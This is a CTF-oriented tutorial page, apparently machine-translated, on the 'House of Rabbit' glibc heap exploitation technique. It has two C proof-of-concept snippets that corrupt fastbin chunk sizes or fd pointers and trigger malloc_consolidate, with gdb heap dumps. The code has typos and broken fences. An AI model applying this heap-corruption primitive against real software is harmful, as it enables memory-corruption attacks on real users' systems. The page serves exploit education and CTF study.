[EN](./house_of_rabbit.md) | [ZH](./house_of_rabbit-zh.md)
# House of Rabbit



## Introduction
House of rabbit is a technique for counterfeiting piles that was introduced as early as 2017 but only appeared in the CTF competition in the last two months. We generally use it in the fastbin attack, because other bins such as unsorted bin have better utilization.


## Principle
We know that fastbin will use the same size of the released heap block to manage with a singly linked list, the allocation will check whether the size is reasonable, if it is unreasonable, the program will exit abnormally. The house of rabbit uses the heap blocks in the fastbin at malloc consolidate to merge and the size is not checked to forge a fake heap to prepare for further utilization.


Since the original author&#39;s [POC] (https://github.com/shift-crops/House_of_Rabbit) requires more conditions, here I directly introduce the nature of this attack.


`Prerequisites`:
1. You can modify the fastbin fd pointer or size
2. Can trigger malloc consolidate (merge top or malloc big chunk, etc.)




Let’s take a look at POC
`POC 1`: modify the size of fastbin chunk

`` `Cpp
unsigned long* chunk1=malloc(0x40); //0x602000

unsigned long* chunk2=malloc(0x40); //0x602050

malloc(0x10);

free(chunk1);

free(chunk2);

/* Heap layout

0000| 0x602000 --> 0x0 

0008| 0x602008 --> 0x51 ('Q')

0016| 0x602010 --> 0x0 

..... 

0080| 0x602050 --> 0x0 

0088| 0x602058 --> 0x51 ('Q')

0096| 0x602060 --> 0x602000 --> 0x0 

0104| 0x602068 --> 0x0 

...... 

0160| 0x6020a0 --> 0x0 

0168| 0x6020a8 --> 0x21 ('!')

0176| 0x6020b0 --> 0x0 

0184| 0x6020b8 --> 0x0 

*/

chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1

malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate

/*Chunk1 overlap with chunk2 now

gdb-peda$ telescope 0x602000 100

0000| 0x602000 --> 0x0 

0008| 0x602008 --> 0xa1 

0016| 0x602010 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...)

0024| 0x602018 --> 0x7ffff7dd1c08 --> 0x7ffff7dd1bf8 --> 0x7ffff7dd1be8 --> 0x7ffff7dd1bd8 --> 0x7ffff7dd1bc8 (--> ...)

0032| 0x602020 --> 0x0 

.....

0080| 0x602050 --> 0x0 

0088| 0x602058 --> 0x51 ('Q')

0096| 0x602060 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...)

0104| 0x602068 --> 0x7ffff7dd1bb8 --> 0x7ffff7dd1ba8 --> 0x7ffff7dd1b98 --> 0x7ffff7dd1b88 --> 0x7ffff7dd1b78 (--> ...)

0112| 0x602070 --> 0x0 

0120| 0x602078 --> 0x0 

....

0152| 0x602098 --> 0x0 

0160| 0x6020a0 --> 0xa0 

0168| 0x6020a8 --> 0x20 (' ')



gdb-peda $ heapinfo
(0x20)     fastbin[0]: 0x0

(0x30)     fastbin[1]: 0x0

(0x40)     fastbin[2]: 0x0

(0x50)     fastbin[3]: 0x0

(0x60)     fastbin[4]: 0x0

(0x70)     fastbin[5]: 0x0

(0x80)     fastbin[6]: 0x0

                  top: 0x603450 (size : 0x1fbb0) 

       last_remainder: 0x0 (size : 0x0) 

            unsortbin: 0x0

(0x050)  smallbin[ 3]: 0x602050

(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )

*/

```

`POC 2`:modify FD pointer

`` `Cpp
unsigned long* chunk1=malloc(0x40); //0x602000

unsigned long* chunk2=malloc(0x100);//0x602050



chunk2[1]=0x31; //fake chunk size 0x30

chunk2[7]=0x21  //fake chunk's next chunk

chunk2[11]=0x21 //fake chunk's next chunk's next chuck

/ * Heap laylout
0000| 0x602000 --> 0x0 

0008| 0x602008 --> 0x51 ('Q')

0016| 0x602010 --> 0x0 

......

0080| 0x602050 --> 0x0 

0088| 0x602058 --> 0x111 

0096| 0x602060 --> 0x0 

0104| 0x602068 --> 0x31 ('1')

0112| 0x602070 --> 0x0 

......

0144| 0x602090 --> 0x0 

0152| 0x602098 --> 0x21 ('!')

0160| 0x6020a0 --> 0x0 

0168| 0x6020a8 --> 0x0 

0176| 0x6020b0 --> 0x0 

0184| 0x6020b8 --> 0x21 ('!')

0192| 0x6020c0 --> 0x0 

......

0352| 0x602160 --> 0x0 

0360| 0x602168 --> 0x20ea1

*/

free(chunk1);

chuck1[0]=0x602060;// modify the fd of chunk1

/*

gdb-peda $ heapinfo
(0x20)     fastbin[0]: 0x0

(0x30)     fastbin[1]: 0x0

(0x40)     fastbin[2]: 0x0

(0x50)     fastbin[3]: 0x602000 --> 0x602060 (size error (0x30)) --> 0x0

*/

malloc(5000);// malloc a  big chunk to trigger malloc consolidate

/*

gdb-peda $ heapinfo
(0x20)     fastbin[0]: 0x0

(0x30)     fastbin[1]: 0x0

(0x40)     fastbin[2]: 0x0

(0x50)     fastbin[3]: 0x0

(0x60)     fastbin[4]: 0x0

(0x70)     fastbin[5]: 0x0

(0x80)     fastbin[6]: 0x0

                  top: 0x6034f0 (size : 0x1fb10) 

       last_remainder: 0x0 (size : 0x0) 

            unsortbin: 0x0

(0x050)  smallbin[ 3]: 0x602000
(0x030)  smallbin[ 1]: 0x602060

*/

```



The principle is very simple, is to modify the size of the fastbin chunk (as shown in POC 1 above) to directly construct the overlap chunk, or modify the fd (as shown by POC 2), let it point to a fake chunk, trigger malloc consolidate and let This fake chunk becomes a legal chunk.


## to sum up
The advantage of House of Rabbit is that it is easy to construct an overlap chunk. Since it can be based on fastbin attack, even leak can be used to complete the attack. You can deepen your understanding of this attack through the exercises of the examples.


## Example
1. HITB-GSEC-XCTF 2018 mutepig

2. To be added















